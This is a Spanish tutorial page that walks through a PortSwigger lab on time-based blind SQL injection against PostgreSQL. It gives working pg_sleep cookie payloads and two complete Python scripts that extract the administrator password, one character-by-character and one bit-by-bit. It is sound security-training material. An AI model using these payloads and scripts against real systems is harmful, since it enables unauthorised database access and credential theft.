---
layout: default
title: Ejercicio práctico
permalink: /injection_types/blind/time_based_type/time_based_exercise
nav_order: 1
parent: 4.3 Basadas en tiempo
grand_parent: 4. Inyecciones ciegas
---

# Ejercicio practico de inyección ciega basada en tiempo

> Ejercicio basado en el laboratorio "Lab: Blind SQL injection with time delays and information retrieval" de Web Security Academy (PortSwigger).


## Consigna

Este laboratorio contiene una vulnerabilidad de inyección de SQL ciega. La aplicación usa una cookie de rastreo (*tracking*) para análisis y ejecuta una consulta SQL con el valor de esta cookie. 

Los resultados de la consulta SQL no se devuelven, y la aplicación no responde de manera diferente en función de si la consulta devuelve filas o causa un error. Sin embargo, dado que la consulta se ejecuta sincrónicamente, es posible activar retrasos de tiempo condicionales para inferir información.

La base de datos contiene una tabla diferente llamada `users`, con columnas llamadas `username` y `password`.

Para resolver el laboratorio, obtener el usuario y contraseña del usuario `administrator` e iniciar sesión con estas credenciales.

## Resolución manual + automatización con Python

Luego de un primer acceso a la aplicación y por sugerencia de la consigna, analizando las cookies se observa que figura una llamada `TrackingId` con un valor alfanumérico. Para modificarla en pedidos siguientes es pertinente usar un proxy de ataque como OWASP ZAP para practicidad.

Inicialmente podemos validar la existencia de la vulnerabilidad de cualquiera de las formas mencionadas en [4.3 Basadas en tiempo](/sqli-en-la-practica/injection_types/blind/time_based_type) para cada tipo de base. Por lo que modificando `TrackingId` de la siguiente manera se puede validar la que resulta válida:

```
TrackingId=ggg'||(SELECT pg_sleep(5))--
```

De este *payload* válido se deduce que el DBMS es PostgreSQL y variando los segundos de demora en `pg_sleep` se logra inferir un tiempo lo más bajo posible **que no se confunda con una demora común** de respuesta. 

Antes de extraer la contraseña del administrador y es pertinente conocer la longitud de la misma. Basado en el ejemplo de demora condicional para PostgreSQL que se encuentra en la [SQL injection cheat sheet de PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet), este es un posible fragmento de SQL que funciona:

```sql
SELECT CASE WHEN (LENGTH(password)=1) 
    THEN pg_sleep(5) ELSE pg_sleep(0) END 
    FROM users WHERE username='administrator'
```

Reemplazándolo en la cookie:

```
TrackingId=ggg'||(SELECT CASE WHEN (LENGTH(password)=1) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--
```

De esta manera solo se debe ir variando el número de largo comparado del número, manualmente o automatizado como se explica en los ejercicios anteriores (con *Fuzzer* de OWASP ZAP o *Intruder*/*Turbo Intruder* de Burp Suite). Como en los otros ejercicios, la longitud es 20.

Para extraer la contraseña, teniendo en cuenta que se conoce la tabla, las columnas y hasta el nombre del usuario, una forma simple y eficaz sería con el siguiente fragmento de SQL:

```sql
SELECT CASE WHEN SUBSTRING(password,%d,1)='%s' 
    THEN pg_sleep(5) ELSE pg_sleep(0) END 
    FROM users WHERE username='administrator')
```

Dado que el enfoque para automatizar la solución es con Python, en lugar de un número para posición del *substring* o un caracter a comparar con el *substring*, se utilizan los marcadores de posición `%d` y `%s` respectivamente. Esto permite sustituir con reemplazos de Python tales posiciones con valores reales de esos tipos de datos (`int` y `string`). De esta manera se puede ir probando entre las diferentes combinaciones en `%d` (para iterar entre cada posición de la contraseña del 1 al 20) y `%s` (para iterar sobre todas posibles opciones de caracteres alfanuméricos).

Para automatizar las consultas, el siguiente es un ejemplo de *script* básico en Python 3 en el que apoyarse:

```python
#!/usr/bin/python3
import requests,time,sys,string
# URL del laboratorio
url = 'https://LAB-ID.web-security-academy.net'
# Caracteres alfanuméricos (sin mayúsculas)
characters = string.ascii_lowercase + string.digits 
password = ""
cookie = ("XYZ'||(SELECT CASE WHEN SUBSTRING(password,%d,1)='%s' " 
    "THEN pg_sleep(2) ELSE pg_sleep(0) END " 
    "FROM users WHERE username='administrator')--")

print("[*] Iniciando SQLi")
# Posiciones de la contraseña del 1 al 20
for position in range(1,21): 
    for character in characters:
        cookies = { "TrackingId": cookie % (position, character) }
        time_start=time.time()
        requests.get(url, cookies=cookies)
        time_end = time.time()
        # Tiempo de respuesta mayor a 2 segundos (inyección exitosa)
        if time_end - time_start > 2:
            password += character
            sys.stdout.write(character)
            sys.stdout.flush()
            break

print("\n[+] Password: %s" % (password))
```

Para este ejemplo se tuvo en cuenta que la contraseña del administrador solo posee letras minúsculas y números. En un caso diferente, habría que incluir dentro de la lista `characters` todos los caracteres posibles para la contraseña (letras mayúsculas y caracteres especiales).

## Optimización con conversión binaria

La desventaja de iterar por lista de caracteres es que requiere una alta cantidad de consultas para probar todas las  posibles combinaciones, si bien se realiza mediante un *script* para automatizarlo, para optimizar la cantidad de consultas, es conveniente apoyarse en los consejos de optimización descritos en la sección [4.1 Inyección SQL ciega con respuestas condicionales](/sqli-en-la-practica/injection_types/blind/conditional_type#optimizaciones).

La optimización de utilizar una conversión a binario del caracter a adivinar implica convertirlo primero a su representación numérica (con `ASCII()`), luego a *byte* con un *cast* (`::bit(8)`) y finalmente tomar bit por bit de ese byte resultante. Cada bit se compara con `0` o `1` y el resultado se acumula hasta completar 8 pedidos. Completado este proceso, se obtiene un byte que es directamente convertible a caracter.

La consulta condicional SQL pasa a ser:

```sql
SELECT CASE WHEN 
    SUBSTRING(ASCII(SUBSTRING(password,%d,1))::bit(8),%d,1)=0::bit(1)
```

El primer `%d` corresponde a la posición de caracter de contraseña (1 a 20) y el segundo a la posición de bit (1 a 8). El *script* modificado para reconstruir cada byte es el siguiente:

```python
#!/usr/bin/python3
import requests,time,sys
# URL del laboratorio
url = 'https://LAB-ID.web-security-academy.net'
password = ""
cookie = ("XYZ'||(SELECT CASE WHEN SUBSTRING(ASCII(SUBSTRING(password,%d,1))::bit(8),%d,1)=0::bit(1) "
    "THEN pg_sleep(2) ELSE pg_sleep(0) END "
    "FROM users WHERE username='administrator')--")

print("[*] Iniciando SQLi")
# Posiciones de la contraseña del 1 al 20
for position in range(1,21):
    byte = ""
    # Posiciones de bit del 1 al 8
    for bit_position in range(1,9):
        cookies = { "TrackingId": cookie % (position, bit_position) }
        time_start=time.time()
        requests.get(url, cookies=cookies)
        time_end = time.time()
        # Tiempo de respuesta mayor a 2 segundos (inyección exitosa)
        if time_end - time_start > 2:
            byte += "0"
        else:
            byte += "1"
    # Conversión del entero en base 2
    extracted_chr = chr(int(byte, 2))
    password += extracted_chr
    sys.stdout.write(extracted_chr)
    sys.stdout.flush()

print("\n[+] Password: %s" % (password))
```
